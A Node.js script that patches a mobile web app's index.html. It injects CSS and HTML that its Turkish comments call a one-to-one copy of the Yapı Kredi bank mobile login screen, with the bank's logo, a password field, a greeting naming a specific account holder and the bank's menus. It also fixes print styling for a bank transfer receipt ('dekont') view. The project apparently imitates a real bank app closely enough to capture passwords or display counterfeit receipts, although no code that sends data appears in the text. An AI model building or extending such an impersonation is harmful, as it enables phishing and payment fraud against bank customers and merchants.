const fs = require('fs');
const path = require('path');

const logoBase64 = fs.readFileSync(path.join(__dirname, 'mobile_app', 'logo_base64.txt'), 'utf8').trim();
let content = fs.readFileSync(path.join(__dirname, 'mobile_app', 'index.html'), 'utf8');

// 1. FIX UNCLOSED @media print { ... } AND UPDATE CSS
// First ensure @media print has its closing brace
const printTarget = `    #originalDekontContent {
        position: fixed !important;
        left: 0 !important;
        top: 0 !important;
        width: 100% !important;
        max-width: 100% !important;
        transform: none !important;
        box-shadow: none !important;
        border: none !important;
        padding: 10px !important;
    }`;

const printReplacement = `    #originalDekontContent {
        position: fixed !important;
        left: 0 !important;
        top: 0 !important;
        width: 100% !important;
        max-width: 100% !important;
        transform: none !important;
        box-shadow: none !important;
        border: none !important;
        padding: 10px !important;
    }
}`;

if (content.includes(printTarget) && !content.includes(printReplacement)) {
    content = content.replace(printTarget, printReplacement);
    console.log('[1/5] @media print kapama parantezi basariyla eklendi!');
}

// 2. RE-INJECT CLEAN CSS
const cssStartMarker = '/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR) */';
const cssEndMarker = '</style>';

const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR) */
        .ykb-real-login-screen {
            min-height: 100vh;
            width: 100%;
            max-width: 430px;
            background: #000000;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
            z-index: 100;
            overflow-y: auto;
            overflow-x: hidden;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            padding-bottom: 74px;
            box-sizing: border-box;
            user-select: none;
            margin: 0 auto;
        }

        /* Üst Header */
        .ykb-login-topbar {
            height: 60px;
            padding: 12px 18px 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
            width: 100%;
            box-sizing: border-box;
        }

        .ykb-switch-btn {
            width: 38px !important;
            height: 38px !important;
            border-radius: 50% !important;
            border: 1px solid rgba(255, 255, 255, 0.3) !important;
            background: rgba(255, 255, 255, 0.05) !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            color: #ffffff !important;
            cursor: pointer;
            transition: background 0.2s;
            position: relative;
            outline: none !important;
            box-shadow: none !important;
            padding: 0 !important;
        }
        .ykb-switch-btn:active {
            background: rgba(255, 255, 255, 0.15) !important;
        }

        /* Profil geçiş tooltip balonu */
        .ykb-switch-tooltip {
            position: absolute;
            top: 52px;
            left: 0;
            background: #262628;
            color: #ffffff;
            border-radius: 12px;
            padding: 10px 14px;
            max-width: 220px;
            font-size: 11px;
            line-height: 1.35;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7);
            z-index: 100;
            display: flex;
            align-items: flex-start;
            gap: 6px;
            cursor: pointer;
            box-sizing: border-box;
        }
        .ykb-switch-tooltip::before {
            content: "";
            position: absolute;
            top: -6px;
            left: 14px;
            border-left: 6px solid transparent;
            border-right: 6px solid transparent;
            border-bottom: 6px solid #262628;
        }
        .ykb-switch-tooltip-close {
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            cursor: pointer;
            margin-left: 4px;
            line-height: 1;
        }

        .ykb-login-logo {
            height: 28px !important;
            max-height: 28px !important;
            width: auto !important;
            max-width: 180px !important;
            object-fit: contain !important;
            display: block !important;
        }

        .ykb-login-bell-btn {
            background: transparent !important;
            border: none !important;
            color: #ffffff !important;
            font-size: 22px !important;
            cursor: pointer;
            padding: 4px;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            outline: none !important;
            box-shadow: none !important;
        }

        /* Orta Avatar ve Selamlama */
        .ykb-login-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding: 10px 20px 0;
            width: 100%;
            max-width: 380px;
            margin: 0 auto;
            box-sizing: border-box;
        }

        .ykb-avatar-wrap {
            position: relative;
            width: 110px;
            height: 110px;
            min-width: 110px;
            min-height: 110px;
            border-radius: 50%;
            background: #dbe2ea;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
            margin: 0 auto;
        }

        .ykb-avatar-badge {
            position: absolute;
            bottom: 2px;
            right: 2px;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #007bc7;
            border: 2.5px solid #000000;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            box-shadow: 0 2px 8px rgba(0, 123, 199, 0.4);
        }

        .ykb-greeting-title {
            margin-top: 18px;
            font-size: 17px;
            font-weight: 500;
            color: #ffffff;
            letter-spacing: -0.2px;
            text-align: center;
        }

        /* Beyaz Şifre Kutusu */
        .ykb-password-box {
            width: 100% !important;
            max-width: 360px !important;
            height: 52px !important;
            background: #ffffff !important;
            border-radius: 14px !important;
            margin: 22px auto 0 !important;
            display: flex !important;
            align-items: center !important;
            padding: 0 16px !important;
            position: relative !important;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15) !important;
            transition: transform 0.2s, box-shadow 0.2s;
            cursor: text;
            box-sizing: border-box !important;
        }
        .ykb-password-box.shake {
            animation: shakePass 0.4s ease;
            box-shadow: 0 0 0 2px #ef4444 !important;
        }
        @keyframes shakePass {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-8px); }
            40%, 80% { transform: translateX(8px); }
        }

        .ykb-pass-lock-icon {
            color: #8e8e93;
            font-size: 17px;
            flex-shrink: 0;
        }

        .ykb-pass-input {
            flex: 1 !important;
            background: transparent !important;
            border: none !important;
            outline: none !important;
            box-shadow: none !important;
            font-size: 16px !important;
            font-weight: 500 !important;
            color: #000000 !important;
            text-align: center !important;
            padding: 0 8px !important;
            letter-spacing: 2px !important;
            height: 48px !important;
            line-height: 48px !important;
            box-sizing: border-box !important;
        }
        .ykb-pass-input::placeholder {
            color: #8e8e93;
            letter-spacing: normal;
            font-weight: 400;
        }

        .ykb-pass-action-btn {
            background: transparent !important;
            border: none !important;
            color: #007bc7 !important;
            font-size: 22px !important;
            cursor: pointer;
            padding: 0 !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            flex-shrink: 0;
            outline: none !important;
            box-shadow: none !important;
            transition: transform 0.15s, opacity 0.2s;
        }
        .ykb-pass-action-btn:active {
            transform: scale(0.9);
        }

        .ykb-forgot-pass-row {
            width: 100% !important;
            max-width: 360px !important;
            display: flex !important;
            justify-content: flex-end !important;
            margin: 12px auto 0 !important;
            box-sizing: border-box !important;
        }
        .ykb-forgot-pass-link {
            color: #ffffff !important;
            font-size: 13.5px !important;
            text-decoration: none !important;
            opacity: 0.95;
            cursor: pointer;
        }
        .ykb-forgot-pass-link:hover {
            text-decoration: underline !important;
        }

        .ykb-login-error-msg {
            display: none;
            color: #f87171;
            font-size: 12px;
            margin-top: 10px;
            text-align: center;
            width: 100%;
            max-width: 360px;
            background: rgba(239, 68, 68, 0.15);
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid rgba(239, 68, 68, 0.3);
            box-sizing: border-box;
        }

        /* Alt Kampanya Kartları Slider */
        .ykb-campaign-carousel-wrap {
            position: relative;
            margin-top: 24px;
            margin-bottom: 10px;
            width: 100%;
            box-sizing: border-box;
        }

        .ykb-campaign-carousel {
            display: flex;
            gap: 12px;
            overflow-x: auto;
            padding: 0 16px;
            scrollbar-width: none;
            -ms-overflow-style: none;
            box-sizing: border-box;
        }
        .ykb-campaign-carousel::-webkit-scrollbar {
            display: none;
        }

        .ykb-campaign-card {
            min-width: 280px;
            width: 280px;
            height: 86px;
            background: #1c1c1e;
            border-radius: 14px;
            padding: 10px 14px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            flex-shrink: 0;
            transition: transform 0.15s ease;
            box-sizing: border-box;
        }
        .ykb-campaign-card:active {
            transform: scale(0.98);
        }

        .ykb-campaign-icon-badge {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: radial-gradient(circle at 35% 30%, #38bdf8 0%, #007bc7 85%);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            color: #ffffff;
            font-size: 22px;
            box-shadow: 0 3px 10px rgba(0, 123, 199, 0.3);
        }

        .ykb-campaign-text {
            color: #ffffff;
            font-size: 12px;
            font-weight: 600;
            line-height: 1.35;
        }

        /* Alt ATM / Şube Tooltip */
        .ykb-atm-tooltip {
            position: absolute;
            right: 14px;
            bottom: 74px;
            background: #262628;
            color: #ffffff;
            border-radius: 12px;
            padding: 8px 12px;
            max-width: 175px;
            font-size: 11px;
            line-height: 1.3;
            font-weight: 500;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7);
            z-index: 100;
            cursor: pointer;
            box-sizing: border-box;
        }
        .ykb-atm-tooltip::after {
            content: "";
            position: absolute;
            bottom: -6px;
            right: 28px;
            border-left: 6px solid transparent;
            border-right: 6px solid transparent;
            border-top: 6px solid #262628;
        }

        /* Alt Sabit Bar (Footer) */
        .ykb-login-bottombar {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 70px;
            background: #000000;
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            display: flex;
            align-items: center;
            justify-content: space-around;
            padding: 0 8px;
            z-index: 999;
            width: 100%;
            max-width: 430px;
            margin: 0 auto;
            box-sizing: border-box;
        }

        .ykb-bottom-item {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #9ca3af;
            text-decoration: none;
            gap: 4px;
            cursor: pointer;
            padding: 4px 0;
        }
        .ykb-bottom-item:active {
            opacity: 0.7;
        }

        .ykb-bottom-icon {
            font-size: 19px;
            color: #ffffff;
            line-height: 1;
            height: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .ykb-bottom-label {
            font-size: 8.5px;
            font-weight: 700;
            letter-spacing: 0.2px;
            color: #cbd5e1;
            text-transform: uppercase;
        }

        /* JET QR Butonu */
        .ykb-jet-qr-btn {
            width: 44px;
            height: 40px;
            border-radius: 11px;
            background: #009fe3;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 22px;
            box-shadow: 0 2px 10px rgba(0, 159, 227, 0.45);
        }

        /* Kullanıcı Değiştirme Modal (Bottom Sheet) */
        .ykb-user-sheet-modal .modal-content {
            background: #18191b;
            color: #ffffff;
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 16px;
        }
        .ykb-user-sheet-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 14px;
            background: #242528;
            border-radius: 14px;
            margin-bottom: 8px;
            cursor: pointer;
            transition: background 0.15s;
        }
        .ykb-user-sheet-item:hover, .ykb-user-sheet-item:active {
            background: #2e3034;
        }
        .ykb-user-sheet-item.active {
            border: 1.5px solid #009fe3;
            background: rgba(0, 159, 227, 0.12);
        }
`;

const idxCssStart = content.indexOf(cssStartMarker);
const idxCssEnd = content.indexOf(cssEndMarker);
if (idxCssStart !== -1 && idxCssEnd !== -1) {
    content = content.slice(0, idxCssStart) + newCss + '    ' + content.slice(idxCssEnd);
    console.log('[2/5] CSS basariyla yenilendi.');
}

// 3. HTML WITH BULLETPROOF INLINE STYLES FOR THE LOGO AND KEY ELEMENTS
const htmlStartMarker = '<div id="mobileLoginPage"';
const htmlEndMarker = '<div class="dark-home-panel">';

const newHtml = `<div id="mobileLoginPage" class="ykb-real-login-screen" style="display: none; min-height: 100vh; width: 100%; max-width: 430px; background: #000000; color: #ffffff; position: relative; box-sizing: border-box; margin: 0 auto; padding-bottom: 74px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
            <!-- ÜST HEADER: GEÇİŞ BUTONU + LOGO + BİLDİRİM -->
            <div class="ykb-login-topbar" style="height: 60px; padding: 12px 18px 0; display: flex; align-items: center; justify-content: space-between; position: relative; width: 100%; box-sizing: border-box;">
                <div class="position-relative">
                    <button type="button" class="ykb-switch-btn" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir" style="width: 38px; height: 38px; border-radius: 50%; border: 1px solid rgba(255, 255, 255, 0.3); background: rgba(255, 255, 255, 0.05); display: flex; align-items: center; justify-content: center; color: #ffffff; cursor: pointer; outline: none; padding: 0;">
                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                            <rect x="0.5" y="1" width="9" height="6.5" rx="1.5" stroke="white" stroke-width="1.1"/>
                            <text x="2" y="6" fill="white" font-size="4.5" font-family="-apple-system, sans-serif" font-weight="700">TR</text>
                            <circle cx="15.5" cy="11.5" r="3.2" stroke="white" stroke-width="1.2"/>
                            <path d="M12 19.5c0-2.2 1.6-3.8 3.5-3.8s3.5 1.6 3.5 3.8" stroke="white" stroke-width="1.2"/>
                            <path d="M7.5 11.5a6.5 6.5 0 0 1 1.8-4.5" stroke="white" stroke-width="1.2" stroke-linecap="round"/>
                            <path d="M6.5 9.5l2.2 2 1.8-2" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M19 8a6.5 6.5 0 0 1 .8 4.2" stroke="white" stroke-width="1.2" stroke-linecap="round"/>
                            <path d="M21 10.5l-2-2.2-2 1.8" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>

                    <!-- Profil Geçiş Tooltip Balonu (Orijinal Ekrandaki Metin) -->
                    <div id="ykbSwitchTooltip" class="ykb-switch-tooltip" style="position: absolute; top: 52px; left: 0; background: #262628; color: #ffffff; border-radius: 12px; padding: 10px 14px; max-width: 220px; font-size: 11px; line-height: 1.35; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7); z-index: 100; display: flex; align-items: flex-start; gap: 6px; cursor: pointer;">
                        <div style="flex: 1;" onclick="openUserSwitcherSheet()">
                            Bireysel ve Kurumsal profilleriniz arasında geçiş yapabilir ya da başka kullanıcı ile kolayca giriş yapabilirsiniz!
                        </div>
                        <span class="ykb-switch-tooltip-close" onclick="dismissSwitchTooltip(event)" title="Kapat" style="color: rgba(255, 255, 255, 0.6); font-size: 14px; cursor: pointer; margin-left: 4px; line-height: 1;">&times;</span>
                    </div>
                </div>

                <!-- Ortada Orijinal Yapı Kredi Beyaz Logosu -->
                <div style="display: flex; align-items: center; justify-content: center;">
                    <img src="${logoBase64}" alt="Yapı Kredi" class="ykb-login-logo" style="height: 28px !important; max-height: 28px !important; width: auto !important; max-width: 170px !important; object-fit: contain !important; display: block !important;">
                </div>

                <!-- Sağda Bildirim Çanı -->
                <div>
                    <button type="button" class="ykb-login-bell-btn" onclick="alert('Yeni bildiriminiz bulunmamaktadır.')" title="Bildirimler" style="background: transparent; border: none; color: #ffffff; font-size: 22px; cursor: pointer; padding: 4px; display: flex; align-items: center; justify-content: center; outline: none;">
                        <i class="bi bi-bell"></i>
                    </button>
                </div>
            </div>

            <!-- ORTA ALAN: AVATAR + SELAMLAMA + BEYAZ ŞİFRE KUTUSU -->
            <div class="ykb-login-center" style="display: flex; flex-direction: column; align-items: center; text-align: center; padding: 10px 20px 0; width: 100%; max-width: 380px; margin: 0 auto; box-sizing: border-box;">
                <!-- Yuvarlak Profil Resmi + Mavi Dokunma Rozeti -->
                <div class="ykb-avatar-wrap" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir" style="position: relative; width: 110px; height: 110px; min-width: 110px; min-height: 110px; border-radius: 50%; background: #dbe2ea; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 16px rgba(0,0,0,0.3); margin: 0 auto;">
                    <svg width="68" height="68" viewBox="0 0 64 64" fill="none">
                        <circle cx="32" cy="22" r="13" fill="#cbd5e1"/>
                        <path d="M12 55C12 43 20.95 38 32 38C43.05 38 52 43 52 55" fill="#cbd5e1"/>
                    </svg>
                    <div class="ykb-avatar-badge" title="Profil Değiştir" style="position: absolute; bottom: 2px; right: 2px; width: 32px; height: 32px; border-radius: 50%; background: #007bc7; border: 2.5px solid #000000; display: flex; align-items: center; justify-content: center; color: #ffffff;">
                        <i class="bi bi-hand-index-thumb-fill" style="font-size: 15px; color: #ffffff; transform: rotate(-10deg);"></i>
                    </div>
                </div>

                <!-- Dinamik Selamlama ve Hesap Sahibi İsmi (Örn: İyi Geceler, BERKAY ÜLKER) -->
                <div class="ykb-greeting-title" id="ykbLoginGreeting" style="margin-top: 18px; font-size: 17px; font-weight: 500; color: #ffffff; letter-spacing: -0.2px; text-align: center;">
                    İyi Geceler, BERKAY ÜLKER
                </div>

                <!-- Beyaz Şifre Hap Kutusu (Orijinal Yapı Kredi 1:1) -->
                <div class="ykb-password-box" id="ykbPasswordBox" onclick="document.getElementById('ykbPasswordInput').focus()" style="width: 100%; max-width: 360px; height: 52px; background: #ffffff; border-radius: 14px; margin: 22px auto 0; display: flex; align-items: center; padding: 0 16px; position: relative; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); box-sizing: border-box; cursor: text;">
                    <i class="bi bi-lock-fill ykb-pass-lock-icon" style="color: #8e8e93; font-size: 17px; flex-shrink: 0;"></i>
                    <input 
                        type="password" 
                        id="ykbPasswordInput" 
                        class="ykb-pass-input" 
                        placeholder="Şifre" 
                        maxlength="20" 
                        inputmode="numeric" 
                        autocomplete="current-password"
                        onkeydown="onPasswordKeyDown(event)"
                        oninput="onPasswordInput(event)"
                        style="flex: 1; background: transparent; border: none; outline: none; box-shadow: none; font-size: 16px; font-weight: 500; color: #000000; text-align: center; padding: 0 8px; letter-spacing: 2px; height: 48px; line-height: 48px; box-sizing: border-box;"
                    />
                    <button type="button" class="ykb-pass-action-btn" id="ykbPassSubmitBtn" onclick="doMobilePasswordLogin()" title="Giriş Yap" style="background: transparent; border: none; color: #007bc7; font-size: 22px; cursor: pointer; padding: 0; display: flex; align-items: center; justify-content: center; flex-shrink: 0; outline: none;">
                        <i class="bi bi-arrow-right-circle-fill"></i>
                    </button>
                </div>

                <!-- Hata Bildirimi (Şifre Yanlış Olduğunda) -->
                <div id="ykbLoginErrorBanner" class="ykb-login-error-msg" style="display: none; color: #f87171; font-size: 12px; margin-top: 10px; text-align: center; width: 100%; max-width: 360px; background: rgba(239, 68, 68, 0.15); padding: 6px 12px; border-radius: 8px; border: 1px solid rgba(239, 68, 68, 0.3); box-sizing: border-box;">
                    Girdiğiniz şifre hatalıdır. Lütfen kontrol ediniz.
                </div>

                <!-- Şifremi Unuttum Bağlantısı -->
                <div class="ykb-forgot-pass-row" style="width: 100%; max-width: 360px; display: flex; justify-content: flex-end; margin: 12px auto 0; box-sizing: border-box;">
                    <a href="javascript:void(0)" class="ykb-forgot-pass-link" onclick="handleForgotPassword()" style="color: #ffffff; font-size: 13.5px; text-decoration: none; opacity: 0.95; cursor: pointer;">Şifremi Unuttum</a>
                </div>
            </div>

            <!-- ALT KAMPANYA KARTLARI SLIDER (Orijinal Ekrandaki Kartlar) -->
            <div class="ykb-campaign-carousel-wrap" style="position: relative; margin-top: 24px; margin-bottom: 10px; width: 100%; box-sizing: border-box;">
                <div class="ykb-campaign-carousel" style="display: flex; gap: 12px; overflow-x: auto; padding: 0 16px; scrollbar-width: none; box-sizing: border-box;">
                    <!-- Kart 1: Araç Kiralama -->
                    <div class="ykb-campaign-card" onclick="alert('Kampanya detayları yakında aktif olacaktır.')" style="min-width: 280px; width: 280px; height: 86px; background: #1c1c1e; border-radius: 14px; padding: 10px 14px; display: flex; align-items: center; gap: 12px; cursor: pointer; flex-shrink: 0; box-sizing: border-box;">
                        <div class="ykb-campaign-icon-badge" style="width: 50px; height: 50px; border-radius: 50%; background: radial-gradient(circle at 35% 30%, #38bdf8 0%, #007bc7 85%); display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #ffffff; font-size: 22px;">
                            <i class="bi bi-car-front-fill" style="font-size: 24px; color: #ffffff;"></i>
                        </div>
                        <div class="ykb-campaign-text" style="color: #ffffff; font-size: 12px; font-weight: 600; line-height: 1.35;">
                            Yapı Kredi müşterilerine özel araç kiralama fırsatı!
                        </div>
                    </div>

                    <!-- Kart 2: Global Finance Ödülü -->
                    <div class="ykb-campaign-card" onclick="alert('Global Finance Best Digital Bank Awards 2026')" style="min-width: 280px; width: 280px; height: 86px; background: #1c1c1e; border-radius: 14px; padding: 10px 14px; display: flex; align-items: center; gap: 12px; cursor: pointer; flex-shrink: 0; box-sizing: border-box;">
                        <div class="ykb-campaign-icon-badge" style="width: 50px; height: 50px; border-radius: 50%; background: radial-gradient(circle at 35% 30%, #38bdf8 0%, #007bc7 85%); display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #ffffff; font-size: 22px;">
                            <i class="bi bi-trophy-fill" style="font-size: 23px; color: #ffc107;"></i>
                        </div>
                        <div class="ykb-campaign-text" style="color: #ffffff; font-size: 12px; font-weight: 600; line-height: 1.35;">
                            Global Finance Best Digital Bank Awards 2026'da büyük ödül!
                        </div>
                    </div>

                    <!-- Kart 3: World Pay / Puan -->
                    <div class="ykb-campaign-card" onclick="alert('World Puan Fırsatları')" style="min-width: 280px; width: 280px; height: 86px; background: #1c1c1e; border-radius: 14px; padding: 10px 14px; display: flex; align-items: center; gap: 12px; cursor: pointer; flex-shrink: 0; box-sizing: border-box;">
                        <div class="ykb-campaign-icon-badge" style="width: 50px; height: 50px; border-radius: 50%; background: radial-gradient(circle at 35% 30%, #a855f7 0%, #007bc7 85%); display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #ffffff; font-size: 22px;">
                            <i class="bi bi-gift-fill" style="font-size: 21px; color: #ffffff;"></i>
                        </div>
                        <div class="ykb-campaign-text" style="color: #ffffff; font-size: 12px; font-weight: 600; line-height: 1.35;">
                            World üye işyerlerinde 500 TL Worldpuan hediye!
                        </div>
                    </div>
                </div>

                <!-- ATM / Şube İşlemleri Tooltip Balonu (Aşağıyı İşaret Eden Orijinal Tooltip) -->
                <div id="ykbAtmTooltip" class="ykb-atm-tooltip" onclick="dismissAtmTooltip()" style="position: absolute; right: 14px; bottom: 74px; background: #262628; color: #ffffff; border-radius: 12px; padding: 8px 12px; max-width: 175px; font-size: 11px; line-height: 1.3; font-weight: 500; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7); z-index: 100; cursor: pointer; box-sizing: border-box;">
                    ATM / Şube işlemlerine artık buradan ulaşabilirsiniz!
                </div>
            </div>

            <!-- ALT SABİT MENÜ BARI: FAST İŞLEMLERİ, PİYASALAR, JET QR, WORLD PAY, DAHA FAZLASI -->
            <div class="ykb-login-bottombar" style="position: absolute; bottom: 0; left: 0; right: 0; height: 70px; background: #000000; border-top: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-around; padding: 0 8px; z-index: 999; width: 100%; max-width: 430px; margin: 0 auto; box-sizing: border-box;">
                <!-- FAST İŞLEMLERİ -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('FAST İşlemleri')" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
                    <div class="ykb-bottom-icon" style="font-size: 19px; color: #ffffff; height: 22px; display: flex; align-items: center; justify-content: center;">
                        <span style="font-weight: 800; font-style: italic; font-size: 15px; color: #ffffff; letter-spacing: -0.5px;">fast</span>
                    </div>
                    <span class="ykb-bottom-label" style="font-size: 8.5px; font-weight: 700; letter-spacing: 0.2px; color: #cbd5e1; text-transform: uppercase;">FAST İŞLEMLERİ</span>
                </a>

                <!-- PİYASALAR -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('Piyasalar')" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
                    <div class="ykb-bottom-icon" style="font-size: 19px; color: #ffffff; height: 22px; display: flex; align-items: center; justify-content: center;">
                        <i class="bi bi-graph-up-arrow" style="font-size: 18px; color: #ffffff;"></i>
                    </div>
                    <span class="ykb-bottom-label" style="font-size: 8.5px; font-weight: 700; letter-spacing: 0.2px; color: #cbd5e1; text-transform: uppercase;">PİYASALAR</span>
                </a>

                <!-- JET QR (Ortadaki Vurgulu Mavi Kare) -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('Jet QR')" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
                    <div class="ykb-jet-qr-btn" style="width: 44px; height: 40px; border-radius: 11px; background: #009fe3; display: flex; align-items: center; justify-content: center; color: #ffffff; font-size: 22px; box-shadow: 0 2px 10px rgba(0, 159, 227, 0.45);">
                        <i class="bi bi-qr-code-scan"></i>
                    </div>
                    <span class="ykb-bottom-label" style="color: #ffffff; margin-top: 2px; font-size: 8.5px; font-weight: 700;">JET QR</span>
                </a>

                <!-- WORLD PAY -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('World Pay')" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
                    <div class="ykb-bottom-icon" style="font-size: 19px; color: #ffffff; height: 22px; display: flex; align-items: center; justify-content: center;">
                        <span style="font-weight: 900; font-style: italic; font-size: 14px; color: #ffffff; letter-spacing: 0.5px;">PAY</span>
                    </div>
                    <span class="ykb-bottom-label" style="font-size: 8.5px; font-weight: 700; letter-spacing: 0.2px; color: #cbd5e1; text-transform: uppercase;">WORLD PAY</span>
                </a>

                <!-- DAHA FAZLASI -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="openUserSwitcherSheet()" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
                    <div class="ykb-bottom-icon" style="font-size: 22px; color: #ffffff; height: 22px; display: flex; align-items: center; justify-content: center;">
                        <i class="bi bi-list" style="font-size: 22px; color: #ffffff;"></i>
                    </div>
                    <span class="ykb-bottom-label" style="font-size: 8.5px; font-weight: 700; letter-spacing: 0.2px; color: #cbd5e1; text-transform: uppercase;">DAHA FAZLASI</span>
                </a>
            </div>
        </div>

        `;

const idxHtmlStart = content.indexOf(htmlStartMarker);
const idxHtmlEnd = content.indexOf(htmlEndMarker);
if (idxHtmlStart !== -1 && idxHtmlEnd !== -1) {
    content = content.slice(0, idxHtmlStart) + newHtml + content.slice(idxHtmlEnd);
    console.log('[3/5] HTML login ekrani basariyla guncellendi.');
}

fs.writeFileSync(path.join(__dirname, 'mobile_app', 'index.html'), content, 'utf8');
console.log('TUM DUZELTMELER BASARIYLA UYGULANDI!');
